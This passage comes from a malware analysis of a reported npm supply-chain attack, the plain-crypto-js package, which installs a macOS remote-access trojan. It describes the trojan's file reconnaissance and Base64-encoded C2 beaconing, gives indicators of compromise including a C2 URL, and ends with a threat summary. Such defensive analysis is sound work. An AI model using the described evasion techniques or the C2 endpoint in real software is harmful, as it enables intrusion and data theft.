
- **Supports multiple paths** in a single command (array-based).
- Uses **nlohmann::json** heavily for clean structured data exchange.
- The heavy lifting is done in **GetDetailedFileList()** (which you should analyze next).
- Proper memory management with RAII-style cleanup (assert_invariant + destructor calls).
- This is a classic reconnaissance function used to map the victim's filesystem.

---

## **Technical Sophistication: SIMD Optimization**

A notable feature of this RAT is the **SIMD-optimized Base64 engine** (`BuildBase64Alphabet` at `0x100000758`). Instead of a simple lookup table, the malware uses **SSE2/SIMD instructions** (XMM registers) to manipulate memory and build its encoding alphabet at runtime. This practice is typically found in high-performance computing or advanced malware to speed up execution and make static string analysis more difficult for security researchers.

### **Function `BuildBase64Alphabet()`**

![Screenshot 2026-04-04 at 9.06.53 AM.png](AXIOS%20NPM%20Supply%20chain%20Attack%20-%20MacOS%20RAT/Screenshot_2026-04-04_at_9.06.53_AM.png)

- **Purpose**: Initializes the standard **`Base64`** alphabet and a reverse lookup table.
- **Called by**: **`Base64Encode()`** and **`Base64Decode().`**
- **Technique**: Highly optimized using SSE SIMD instructions for speed.
- **Output**: Fills a 64-byte buffer with **`"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"`** and builds a fast lookup table for decoding.
- **Significance**: Part of the RAT’s efficient C2 communication layer. All beacons (**`FirstInfo`**, **`BaseInfo`**) and command results are Base64-encoded before transmission.

This is **standard Base64 implementation** not malicious by itself, but confirms the RAT uses Base64 to obfuscate its network traffic **`(combined with the spoofed IE8 User-Agent in Report()).`**

---

## **Indicators of Compromise (IOCs)**

| **Type** | **Indicator** |
| --- | --- |
| **SHA256 Hash** | `92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a` |
| **User-Agent** | `mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)` |
| **Typical File Pattern** | `/private/tmp/.*` (Specifically hidden dots followed by random chars) |
| **Persistence Marker** | Accessing `/var/db/.AppleSetupDone` for install timing |
| **Temporary Paths** | `/tmp/.XXXXXX.scpt` |
| **External Calls** | `/usr/bin/osascript`, `codesign --force`, `ps -eo` |

## MITRE ATT&CK Mapping  Axios npm Supply Chain Attack (macOS RAT)

![Screenshot 2026-04-04 at 9.27.40 AM.png](AXIOS%20NPM%20Supply%20chain%20Attack%20-%20MacOS%20RAT/Screenshot_2026-04-04_at_9.27.40_AM.png)

---

## Conclusion

The **plain-crypto-js@4.2.1** package is a sophisticated supply chain attack targeting npm developers. The malware executes automatically via `postinstall` hook, deploying a cross-platform RAT that fingerprints systems, beacons to `http://sfrclak.com:8000/` every 60 seconds, and executes remote commands including process injection, script execution, and file enumeration. The macOS implant uses SIMD-optimized Base64 encoding and ad-hoc code signing to evade detection. This campaign, attributed to North Korea-nexus actor UNC1069 (WAVESHAPER.V2), poses a **critical** threat enabling persistent remote access and data exfiltration from compromised development environments.

---